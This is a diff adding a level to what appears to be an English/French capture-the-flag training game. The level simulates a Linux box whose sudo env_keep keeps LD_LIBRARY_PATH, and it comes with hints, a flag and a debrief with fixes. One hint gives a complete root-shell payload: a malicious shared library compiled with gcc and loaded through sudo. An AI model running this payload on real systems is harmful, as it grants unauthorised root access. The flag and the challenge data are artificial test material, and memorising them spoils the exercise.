+            en: ['Check your sudo permissions and preserved variables', 'Find which library /usr/local/bin/backup-agent is missing', 'Plant a malicious copy under a writable LD_LIBRARY_PATH', 'Trigger it via sudo'],
+            fr: ['Vérifier tes droits sudo et les variables préservées', 'Trouver quelle bibliothèque il manque à /usr/local/bin/backup-agent', 'Planter une copie malveillante sous un LD_LIBRARY_PATH modifiable', 'La déclencher via sudo']
+        },
+        hints: {
+            en: [
+                'Try: sudo -l — look closely at env_keep.',
+                'LD_LIBRARY_PATH adds a search directory for shared libraries. Unlike LD_PRELOAD, the loaded file has to be named exactly what the target program is looking for: libagent.so.1 (see /usr/local/bin/README.txt).',
+                'Payload: echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/libagent.so.1.c ; gcc -shared -fPIC -nostartfiles -o /tmp/libagent.so.1 /tmp/libagent.so.1.c ; sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent'
+            ],
+            fr: [
+                'Essaie : sudo -l — regarde bien env_keep.',
+                'LD_LIBRARY_PATH ajoute un dossier de recherche pour les bibliothèques partagées. Contrairement à LD_PRELOAD, le fichier chargé doit porter exactement le nom que le programme cible recherche : libagent.so.1 (voir /usr/local/bin/README.txt).',
+                'Payload : echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/libagent.so.1.c ; gcc -shared -fPIC -nostartfiles -o /tmp/libagent.so.1 /tmp/libagent.so.1.c ; sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent'
+            ]
+        },
+        flag: 'flag{ld_l1brary_p4th_pwn}',
+        vulnLib: 'libagent.so.1',
+        fs: {
+            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
+            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
+            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
+            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
+            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
+            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
+            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
+            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
+            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{ld_l1brary_p4th_pwn}\n' },
+            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin', 'local'] },
+            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'gcc'] },
+            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/bin/sudo': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
+            '/usr/bin/gcc': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
+            '/usr/local': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
+            '/usr/local/bin': { type: 'dir', owner: 'root', mode: '755', children: ['backup-agent', 'README.txt'] },
+            '/usr/local/bin/backup-agent': { type: 'file', owner: 'root', mode: '755', content: 'ELF 64-bit LSB executable — dynamically linked, missing shared library: libagent.so.1' },
+            '/usr/local/bin/README.txt': { type: 'file', owner: 'root', mode: '644', content: 'Internal backup agent.\nDepends on libagent.so.1 (not yet packaged for this distro — ops loads it via LD_LIBRARY_PATH in prod, ugh).\n' },
+            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
+            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
+            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
+            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
+        },
+        sudoers: {
+            player: [
+                { cmd: '/usr/local/bin/backup-agent', nopasswd: true, runas: 'root' }
+            ]
+        },
+        env_keep: ['LD_LIBRARY_PATH'],
+        wins: [
+            { type: 'ld_library_path' }
+        ],
+        debrief: {
+            en: {
+                vuln: 'sudo env_keep leaks LD_LIBRARY_PATH',
+                why: "LD_LIBRARY_PATH tells the dynamic linker extra places to search for shared libraries before the system defaults. backup-agent was shipped depending on libagent.so.1 without an absolute rpath, so whichever directory LD_LIBRARY_PATH points at gets searched first. Sudo normally scrubs the environment, but this box's Defaults line explicitly keeps LD_LIBRARY_PATH — so a same-named malicious .so placed anywhere sudo LD_LIBRARY_PATH points loads as root the instant the agent runs.",
+                fix: 'Never add LD_PRELOAD or LD_LIBRARY_PATH to env_keep. Ship dependencies with a proper package or an absolute RPATH/RUNPATH baked into the binary instead of relying on a searched path at runtime.',
+                link: 'https://gtfobins.github.io/gtfobins/#+shell'
+            },
+            fr: {
+                vuln: 'sudo env_keep expose LD_LIBRARY_PATH',
+                why: "LD_LIBRARY_PATH indique à l'éditeur de liens dynamique des dossiers supplémentaires à chercher pour les bibliothèques partagées, avant les emplacements système par défaut. backup-agent a été livré en dépendant de libagent.so.1 sans rpath absolu : le dossier pointé par LD_LIBRARY_PATH est donc cherché en premier. sudo nettoie normalement l'environnement, mais la ligne Defaults de cette box préserve explicitement LD_LIBRARY_PATH — un .so malveillant portant le bon nom, placé où pointe sudo LD_LIBRARY_PATH, se charge alors en root dès que l'agent tourne.",
+                fix: 'Ne jamais ajouter LD_PRELOAD ou LD_LIBRARY_PATH à env_keep. Livre les dépendances via un vrai paquet, ou avec un RPATH/RUNPATH absolu intégré au binaire plutôt que de compter sur un chemin de recherche à l\'exécution.',
+                link: 'https://gtfobins.github.io/gtfobins/#+shell'
+            }
+        }
     }
 ];
